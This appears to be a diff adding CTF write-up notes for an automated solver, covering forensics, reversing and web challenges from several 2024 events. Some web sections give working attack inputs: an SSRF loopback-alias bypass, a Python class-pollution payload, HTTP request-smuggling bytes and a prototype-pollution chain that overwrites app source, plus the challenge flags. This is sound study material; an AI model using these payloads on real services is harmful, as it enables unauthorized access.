+### TJCTF 2024: conversations
+
+Category:
+
+- Forensics / traffic.
+
+Signal:
+
+- The handout is a PCAP with normal browser/captive-portal chatter and a small local HTTP file transfer.
+- `tshark` summaries can expose the interesting HTTP path, but the flag may be easiest to recover from raw capture bytes.
+- The useful marker is a direct `tjctf{...}` string near the downloaded `flag.jpeg` payload.
+
+Shortest path:
+
+```text
+identify capture.pcap
+run normal tshark summaries and stream/object checks
+bounded raw capture scan over printable bytes
+extract tjctf{I_bh0p_to_sk00l_1337}
+preserve raw_capture_flag_scan evidence with bytes_scanned and truncation state
+```
+
+Solver lesson:
+
+- TrafficSolver should not rely only on tshark's field extraction; direct printable-byte scans catch simple HTTP/object payload flags that remain in the PCAP body.
+- Keep the scan bounded and preserve whether it was truncated so large captures stay safe to automate.
+
+### TJCTF 2024: fetcher
+
+Category:
+
+- Web / loopback-alias SSRF.
+
+Signal:
+
+- The Express source accepts a submitted URL and checks only `localhost` or `127.0.0.1` substrings before calling server-side `fetch`.
+- `/flag` returns the flag only when `req.ip` is loopback.
+- The 127.0.0.0/8 range provides loopback aliases such as `127.0.0.2`, which bypass the substring check but still reaches the local service.
+
+Shortest path:
+
+```text
+build and start the provided Bun/Express service locally
+POST /fetch with url=http://127.0.0.2:3000/flag
+capture response: hey myself! here's your flag: tjctf{h3ll0_m3_h3e_h3e_d699bdcd}
+```
+
+Solver lesson:
+
+- Source SSRF checks should be reviewed as URL parser behavior plus network identity behavior, not only as string matching.
+- Preserve the exact source blacklist, the SSRF URL, and the local-only route condition.
+- Keep replay bounded: start the provided challenge container, hit the local mapped service, and tear the container down after the proof.
+
+### DownUnderCTF 2024: co2
+
+Category:
+
+- Web / Python class pollution.
+
+Signal:
+
+- `save_feedback` parses user JSON and calls `merge(data, feedback)`.
+- `merge` recursively uses `setattr(dst, k, v)` and does not block magic attributes.
+- `/get_flag` returns the flag only when the module global `flag` equals `"true"`.
+
+Shortest path:
+
+```text
+register and log in to the local Flask service
+POST /save_feedback with:
+{"__class__":{"__init__":{"__globals__":{"flag":"true"}}}}
+GET /get_flag
+DUCTF{_cl455_p0lluti0n_ftw_}
+```
+
+Solver lesson:
+
+- Python recursive merge helpers can be equivalent to prototype pollution when magic attributes are writable.
+- Preserve both the merge sink and the exact pollution path, not only the final flag.
+- A local Python venv replay is a useful fallback when Docker Hub rate limiting blocks the original challenge image.
+
+### UMDCTF 2024: HTTP Fanatics
+
+Category:
+
+- Web / HTTP request smuggling through protocol translation.
+
+Signal:
+
+- The Rust reverse proxy blocks direct HTTP/3 `/admin/register` requests.
+- The proxy converts HTTP/3 requests into HTTP/1.1 bytes for the FastAPI backend.
+- During conversion, `Transfer-Encoding: chunked` is preserved and body bytes are forwarded, letting a zero-length chunk terminate the visible request and expose a second backend request.
+
+Shortest path:
+
+```text
+construct proxy-emitted H1 bytes:
+PUT /put HTTP/1.1
+transfer-encoding: chunked
+
+0
+
+POST /admin/register HTTP/1.1
+Content-Length: 36
+
+{"username":"bob","password":"bob2"}
+send those bytes to the local FastAPI backend
+GET /dashboard with credentials cookie for bob/bob2
+UMDCTF{w4tCh_0ut_F0R_RE9u3sT_5mugg1iN9}
+```
+
+Solver lesson:
+
+- For protocol-upgrade challenges, preserve both the front-door rule and the exact backend wire format.
+- Request smuggling evidence should include the conflicting framing headers and the hidden request method/path.
+- A local backend replay can prove the vulnerable conversion without needing a live QUIC endpoint.
+
+### NUS Greyhats Welcome CTF 2024: ASM
+
+Category:
+
+- Reverse / Python VM.
+
+Signal:
+
+- The handout is a Python VM whose program computes a number, calls `PRINTFLAG R0`, and XORs `flag_enc` with `sha1(str(register_value))`.
+- The VM loop searches for a perfect number where `R0 % 31337 == 2410`.
+- Known even perfect numbers from Mersenne prime exponents make the search tiny without emulating the slow VM loop.
+
+Shortest path:
+
+```text
+parse flag_enc bytes literal
+parse MOV R2 31337 and MOV R5 2410 from the VM program
+enumerate known Mersenne-prime perfect numbers
+find exponent 61 satisfying perfect_number % 31337 == 2410
+xor flag_enc with sha1(str(perfect_number)).digest() repeated
+grey{p3rf3c7_r3v3r51n6}
+```
+
+Solver lesson:
+
+- Python challenge VMs often reveal enough structure for static recovery: encrypted flag bytes, a hash-derived stream, and a mathematical predicate.
+- Preserve the modulus, remainder, Mersenne exponent, and decoded candidate in evidence so the solve is auditable without running a huge loop.
+
+### TJCTF 2024: cagnus-marlsen
+
+Category:
+
+- Reverse / Python grid constraints.
+
+Signal:
+
+- The handout is a Python/Tkinter 8x8 grid UI, but the interesting logic is a pure `verify()` function over `grid = [0]*64`.
+- The verifier derives row, column, and diagonal bytes (`b0` through `b17`), accumulates many boolean constraints, then returns `tjctf{` plus selected `chr(bN)` bytes.
+- The constraint system has non-printable satisfying models, so returned bytes should be constrained to common CTF flag-body characters before accepting a model.
+
+Shortest path:
+
+```text
+parse the local Python artifact
+model 64 grid cells as 0/1 Z3 integer variables
+add row, column, diagonal, hamming-distance, popcount, xor, shift, and equality constraints
+constrain returned chr(bN) bytes to [A-Za-z0-9_]
+recover tjctf{n1C3_0n3}
+```
+
+Solver lesson:
+
+- GUI reverse challenges often have a deterministic verifier that can be solved without opening the UI or executing challenge callbacks.
+- Preserve the solved grid bits and the byte registers used for the flag so the model is auditable.
+
+### IrisCTF 2024: CloudVM
+
+Category:
+
+- Reverse / custom VM pixel-art validation.
+
+Signal:
+
+- Binary artifact starts with `MLVM` and embeds function names such as `paint`, `render`, `suSsY`, and `SUssY`.
+- Strings show a terminal paint UI plus `Success! You have the right image! Wrap the name of this thing in irisctf{}`.
+- The checker repeats `movc r0, offset; movc r1, left; movc r2, right; call SUssY; jmpneq fail, r2` over many 4-byte canvas chunks.
+
+Shortest path:
+
+```text
+parse MLVM function table and scan helper-call validation triplets
+for each chunk, brute force four color bytes in range 0..7
+match ((mem & 0xff) | (mem & 0xff00) | ((mem >> 12) & 0xff) | ((mem >> 12) & 0xff00)) == left ^ right
+render the recovered 17x17 stride-16 canvas
+classify the pixel art as a gameboy
+irisctf{gameboy}
+```
+
+Solver lesson:
+
+- Custom VM reverse tasks may not require full emulation when the validation helper is a compact repeated idiom.
+- Preserve the rendered canvas, function names, check count, stride, and template score as proof-of-solve evidence.
+- Filter bytecode scans by the helper-call shape; ordinary setup code can also contain `movc r0/r1/r2` triplets and should not be treated as validation checks.
+
+### IrisCTF 2024: Corrupted World
+
+Category:
+
+- Forensics / Minecraft Anvil region recovery.
+
+Signal:
+
+- The handout is a single `r.0.0.mca` Minecraft region file.
+- The prompt says a chest became empty after a crash and gives coordinates, so current chunk state may not contain the original item data.
+- Header-referenced chunks can be valid while an unreferenced old sector still preserves deleted chest `Items` and JSON `Lore`.
+
+Shortest path:
+
+```text
+parse the .mca location table and collect referenced sectors
+zlib/gzip-decode every candidate sector, including orphan sectors
+extract printable NBT strings and JSON {"text": "..."} fragments
+ignore long titles/item names, then join short lore fragments
+recover irisctf{block_game_as_a_file_system}
+```
+
+Solver lesson:
+
+- Do not stop at the current chunk pointed to by the Anvil header. Crash/deletion CTFs can hide evidence in orphan sectors left behind by old chunk versions.
+- Preserve `minecraft_region`, `orphan_sector`, and `json_texts` evidence so the recovered flag is tied to a local artifact path and not a README oracle.
+- Keep region parsing bounded: use compressed sector headers and fast printable-run extraction, then retain only interesting/flag-bearing chunk summaries.
+
+### NUS Greyhats Welcome CTF 2024: filefactory
+
+Category:
+
+- Forensics / archive and image evidence.
+
+Signal:
+
+- The provided `flag.pdf` is actually a Zip archive.
+- The inner `flag.png` starts with `JESS` followed by a normal PNG signature tail and `IHDR`, so the first four bytes were deliberately mangled.
+- Repairing the signature produces a valid PNG with a handwritten flag. `scripts/solve_filefactory.py` now preserves both the repaired artifact and the visual transcription used for the flag replay.
+
+Shortest evidence path:
+
+```text
+run file on flag.pdf and treat it as Zip archive data
+list archive entries and extract flag.png into the managed artifact workspace
+detect JESS...IHDR and repair the PNG signature to 89 50 4e 47
+open the repaired PNG for visual/OCR follow-up
+preserve the visual transcription as grey{these_files_are_kinda_weird_but_im_weirder}
+```
+
+Solver lesson:
+
+- Archive recursion should not stop at text previews; interesting image entries need magic-byte repair and follow-on image analysis.
+- Do not mark handwritten visual flags solved unless an OCR/visual layer or a human replay step preserves the read value as evidence.
+- The current replay is deterministic for archive detection and PNG repair, but the final handwritten text read is still a visual transcription step rather than generic OCR automation.
+
+### DUCTF 2024: Prisoner Processor
+
+Category:
+
+- Web / source-only review.
+
+Signal:
+
+- Provided ZIP contains a Hono/Bun TypeScript service, examples, and a placeholder local `flag.txt`.
+- Source imports `yaml`, writes YAML output files, exposes `/convert-to-yaml`, and validates signed fields through HMAC.
+- `getSignedData()` copies `signed.*` keys into a normal object, which makes `signed.__proto__` a prototype-pollution route for unsigned `outputPrefix`.
+- Bun file paths can be shaped with null-byte truncation, and `/proc/self/fd/3` can pivot around the denylist toward the loaded `index.ts`.
+- YAML output can be shaped into valid TypeScript, then a crash/restart path executes the overwritten app source and reaches the SUID `getflag` helper.
+
+Shortest evidence path:
+
+```text
+unzip source archive
+read src/app/src/index.ts
+extract routes: /convert-to-yaml, /examples
+record YAML serialization and signed-parameter evidence
+reject DUCTF{test_flag_real_flag_on_instance} as handout placeholder
+record proof chain: prototype pollution -> Bun null byte -> /proc/self/fd/3 -> YAML-as-TypeScript -> getflag
+```
+
+Local authorized replay:
+
+```bash
+cd .forgeflag/heldout-cache/ductf2024/web/prisoner-processor
+docker compose up --build -d
+cd /Users/5haw0/Documents/ForgeFlag
+python3 scripts/solve_prisoner_processor.py http://127.0.0.1:1337
+docker compose -f .forgeflag/heldout-cache/ductf2024/web/prisoner-processor/docker-compose.yml down
+```
+
+The replay helper writes a bounded TypeScript payload that returns `/bin/getflag` output over HTTP. It does not use a reverse shell. Verified local output:
+
+```text
+DUCTF{bUnBuNbUNbVN_hOn0_tH15_aPp_i5_d0n3!!!one1!!!!}
+```
+
+Solver lesson:
+
+- WebSolver should unpack source archives and read full source files, not only 500-byte generic archive previews.
+- Source-only Web challenges can produce useful route, bug-class, and exploit-chain evidence without active probing, but proof-of-solve still needs scoped target reproduction or a local service harness.
+- Do not accept handout placeholders such as `test_flag_real_flag_on_instance`; preserve them as rejected candidates and keep the case open until the real service flag is recovered.
+- When a local harness is available, prefer a non-interactive proof endpoint over reverse-shell payloads so replay remains bounded, auditable, and automation-friendly.
+
+### Local reverse sample: reverseMe.exe
+
+Category:
+
+- Reverse / PE32 key-check validation.
+
+Signal:
+
+- The local artifact is a PE32 i386 console executable.
+- Strings reveal `please input the key:`, `right!!!`, and `error!!!`, but not the flag.
+- The validation function writes a 26-byte encrypted buffer to the stack, pushes length `26` and seed `56`, calls a local XOR decoder, then compares the decoded buffer against user input.
+
+Shortest evidence path:
+
+```text
+file reverseMe.exe -> PE32 executable (console) Intel 80386
+trace prompt/right/error strings to the validation function
+recover stack ciphertext e376fb6fd828f270e87649804b9d568e62b226bd208402831ad8
+regenerate XOR key from seed 56: step = seed * 2 + 0x0a, start = step * 10 - 9
+decrypt to XCTF{5eacs6y8p1o9gitc9521}
+```
+
+Solver lesson:
+
+- Do not treat a reverse flag candidate as a strings hit unless the accepted flag appears in strings output.
+- For PE key-check warmups, scan x86 stack-byte initializers and nearby `push length` / `push seed` / `call decoder` sequences before requiring full decompilation.
+- Preserve `pe_stack_xor_key_check` evidence with seed, encrypted bytes, key preview, decoded text, and accepted flag so the write-up can explain the real path.
+
+### Local reverse sample: xor_nodebug
+
+Category:
+
+- Reverse / ELF argv repeating XOR validation.
+
+Signal:
+
+- The local artifact is an x86-64 PIE ELF that imports `ptrace`, `strlen`, and `strcmp`.
+- `ptrace` only prints `don't trace me:(` as anti-debug noise; the real validation continues in `main`.
+- `.rodata` contains the status string `right` and the printable ciphertext `sgu\`ttd]{jt`.
+- `main` initializes a stack key with little-endian immediates `0x5030201`, `0x706`, and a null terminator, giving key bytes `01 02 03 05 06 07`.
+
+Shortest evidence path:
+
+```text
+file xor_nodebug -> ELF 64-bit LSB pie executable, x86-64
+strings -n 4 xor_nodebug -> ptrace, strcmp, strlen, don't trace me:(, sgu`ttd]{jt, right
+objdump -d -M intel xor_nodebug -> stack key bytes 01 02 03 05 06 07 and strcmp target 0x2015
+objdump -s -j .rodata xor_nodebug -> 0x2015 = sgu`ttd]{jt
+decode ciphertext[i] ^ key[i % 6] -> reverse_xor
+```
+
+Replay:
+
+```bash
+docker run --rm --platform linux/amd64 \
+  -v "$PWD:/workspace" -w /workspace ubuntu:22.04 \
+  bash -lc 'chmod +x .forgeflag/artifacts/reverse-20260702-112457-xor-nodebug/xor_nodebug && ./.forgeflag/artifacts/reverse-20260702-112457-xor-nodebug/xor_nodebug reverse_xor'
+```
+
+Verified output:
+
+```text
+sgu`ttd]{jt
+right
+```
+
+Solver lesson:
+
+- Anti-debug imports should not block static recovery when the validation loop and constants are visible.
+- Some reverse tasks accept a bare key/input rather than a `flag{...}` token; preserve it as `recovered_input` evidence and allow verifier acceptance only when the evidence explicitly marks it.
+- Apple Silicon/OrbStack dynamic replay may need `--platform linux/amd64` or an amd64 base image; static `.rodata` plus disassembly evidence should still recover the answer.
+
+### 鹏城杯 2022: babybit
+
+Category:
+
+- Forensics / VMDK / Windows registry hive timeline.
+
+Signal:
+
+- Attachment `babybit.vmdk` is a VMware4 monolithic sparse disk image.
+- Generic `file/strings/binwalk` triage finds no direct flag.
+- `foremost` carves `foremost-output/zip/00011728.zip`, which contains `RegistryBackup/20220613/{BCD,SAM,SOFTWARE,SYSTEM}`.
+- The relevant evidence is in the binary `SYSTEM` hive, not in plain strings: `ControlSet001\Control\FVEStats`.
+
+Shortest evidence path:
+
+```text
+file babybit.vmdk -> VMware4 disk image
+carve embedded zip at offset 6004736
+open RegistryBackup/20220613/SYSTEM
+read ControlSet001\Control\FVEStats:
+  OsvEncryptInit = 132995782594427750
+  OsvEncryptComplete = 132995786261823536
+convert Windows FILETIME to UTC+8:
+  2022/6/13_15:17:39
+  2022/6/13_15:23:46
+```
+
+Replay:
+
+```bash
+python3 scripts/solve_babybit_vmdk.py .forgeflag/artifacts/forensics-20260630-132526-babybit-vmdk/babybit.vmdk
+```
+
+Recovered flag:
+
+```text
+PCL{2022/6/13_15:17:39_2022/6/13_15:23:46}
+```
+
+Solver lesson:
+
+- Do not stop at `foremost success`; enumerate carved artifacts and recurse into archives.
+- VMDK/disk forensics often needs filesystem or carved-file follow-up even when `binwalk` shows no signatures.
+- RegistryBackup hives should be parsed structurally. For BitLocker timeline questions, read `SYSTEM\ControlSet001\Control\FVEStats` and convert FILETIME with timezone evidence.
